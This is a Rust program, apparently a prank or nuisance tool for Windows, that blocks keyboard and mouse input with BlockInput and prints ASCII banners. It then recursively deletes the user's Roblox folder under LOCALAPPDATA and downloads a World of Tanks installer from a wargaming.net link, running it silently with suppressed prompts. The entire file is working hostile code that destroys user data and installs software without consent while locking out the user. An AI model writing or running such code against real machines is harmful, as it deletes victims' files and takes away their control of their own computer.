use reqwest;
use tokio;
use tokio::io::AsyncWriteExt;
use std::process::Command;
use std::thread::sleep;
use windows_sys;
use std::fs;
use std::env;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>>{
    let target = "https://redirect.wargaming.net/WoT/latest_web_install_eu?_gl=1*zr7lmy*_gcl_au*NjI5NzkzMDcxLjE3NjQ1MDY1MTU.*_ga*ODU2MzY2MDY1LjE3NjQ1MDY1MTU.*_ga_BWRKLL4HR5*czE3NjQ1MDY1MTUkbzEkZzEkdDE3NjQ1MjE0MDUkajUxJGwwJGgw";
    let file_name = "world_of_tanks_install_eu_delxx1gr7w1s.exe";

    let local_app_data = env::var("LOCALAPPDATA").unwrap_or(String::from("."));
    let roblox_path_string = format!("{}\\Roblox", local_app_data);
    let roblox_path = roblox_path_string.as_str();

    inputblocker(1);

    println!(r"
█████   █████          ████  ████               ███
░░███   ░░███          ░░███ ░░███              ░░░
 ░███    ░███   ██████  ░███  ░███   ██████     ████  ████████
 ░███████████  ███░░███ ░███  ░███  ███░░███   ░░███ ░░███░░███
 ░███░░░░░███ ░███████  ░███  ░███ ░███ ░███    ░███  ░███ ░███
 ░███    ░███ ░███░░░   ░███  ░███ ░███ ░███    ░███  ░███ ░███
 █████   █████░░██████  █████ █████░░██████     █████ ████ █████
░░░░░   ░░░░░  ░░░░░░  ░░░░░ ░░░░░  ░░░░░░     ░░░░░ ░░░░ ░░░░░
    ");
    println!(r"
 ██████████   ███████████   █████ ██████████
░░███░░░░███ ░░███░░░░░███ ░░███ ░░███░░░░███
 ░███   ░░███ ░███    ░███  ░███  ░███   ░░███
 ░███    ░███ ░██████████   ░███  ░███    ░███
 ░███    ░███ ░███░░░░░███  ░███  ░███    ░███
 ░███    ███  ░███    ░███  ░███  ░███    ███
 ██████████   █████   █████ █████ ██████████
░░░░░░░░░░   ░░░░░   ░░░░░ ░░░░░ ░░░░░░░░░░
 ");
    sleep(std::time::Duration::from_secs(3));

    clear_console();

    println!("Deleting Roblox and Roblox Studio...");
    deleter(roblox_path);

    if let Err(e) = installer(target, file_name).await {
        eprintln!("Error with installing: {}", e);
    }
    sleep(std::time::Duration::from_secs(3));
    clear_console();
    println!(r"
   █████████                        █████ █████
  ███░░░░░███                      ░░███ ░░███
 ███     ░░░   ██████   ██████   ███████  ░███████  █████ ████  ██████
░███          ███░░███ ███░░███ ███░░███  ░███░░███░░███ ░███  ███░░███
░███    █████░███ ░███░███ ░███░███ ░███  ░███ ░███ ░███ ░███ ░███████
░░███  ░░███ ░███ ░███░███ ░███░███ ░███  ░███ ░███ ░███ ░███ ░███░░░
 ░░█████████ ░░██████ ░░██████ ░░████████ ████████  ░░███████ ░░██████
  ░░░░░░░░░   ░░░░░░   ░░░░░░   ░░░░░░░░ ░░░░░░░░    ░░░░░███  ░░░░░░
                                                     ███ ░███
                                                    ░░██████
                                                     ░░░░░░
                                                     ");
    inputblocker(0);
    sleep(std::time::Duration::from_secs(3));
    Ok(())
}

async fn installer(target: &str, file_name: &str) -> Result<(), Box<dyn std::error::Error>> {

    println!("Starting installer...");
    let mut response = reqwest::get(target).await?;
    let mut file = tokio::fs::File::create(file_name).await?;

    while let Some(chunk) = response.chunk().await? {
        file.write_all(&chunk).await?;
    }
    file.flush().await?;
    drop(file);
    println!("File saved successfully!");

    match Command::new(file_name)
        .args(["/SILENT", "/SP-", "/NORESTART", "/SUPPRESSMSGBOXES"])
        .spawn()
    {
        Ok(mut child) => {
            println!("Installer started...");

            if let Err(e) = child.wait() {
                eprintln!("Error waiting for installer: {}", e);
            }

            println!("Installation finished!");
        },
        Err(e) => eprintln!("Error starting installer: {}", e),
    }
    Ok(())
}
fn deleter(roblox_path: &str) {
    println!("Starting deleter...");
    match fs::remove_dir_all(roblox_path) {
        Ok(_) => println!("Folder deleted successfully!"),
        Err(e) => println!("Error: {}", e),
    }
    println!("Done!");
}

fn inputblocker(argument: i32) {
    println!("Starting inputblocker...");
    #[cfg(target_os = "windows")]
    unsafe {
        use windows_sys::Win32::UI::Input::KeyboardAndMouse::BlockInput;
        BlockInput(argument);
    }
}
fn clear_console() {
    if cfg!(target_os = "windows") {
        Command::new("cmd").args(["/c", "cls"]).status().unwrap();
    } else {
        print!("\x1B[2J\x1B[1;1H");
    }
}